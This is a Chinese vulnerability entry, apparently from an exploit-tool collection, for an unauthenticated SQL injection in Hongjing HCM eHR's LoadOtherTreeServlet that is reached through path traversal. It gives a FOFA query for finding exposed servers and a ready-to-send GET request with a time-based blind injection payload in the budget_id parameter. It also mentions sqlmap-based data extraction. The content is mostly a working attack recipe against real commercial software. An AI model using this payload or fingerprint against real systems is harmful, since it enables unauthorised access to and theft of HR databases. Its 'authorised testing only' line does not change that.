---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM LoadOtherTreeServlet SQL注入漏洞

## 漏洞描述

宏景HCM `/w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet` 接口 `budget_id` 参数存在 SQL 注入漏洞（延时盲注），经 oauthservlet 目录穿越未授权访问。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&flag=1&budget_id=1';waitfor delay '0:0:3'-- HTTP/1.1
```

`budget_id` 参数拼接延时语句，响应延迟即确认注入；工具 PoC 采用 sqlmap 模块做延时盲注提取数据（注入类型标注为延时注入）。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
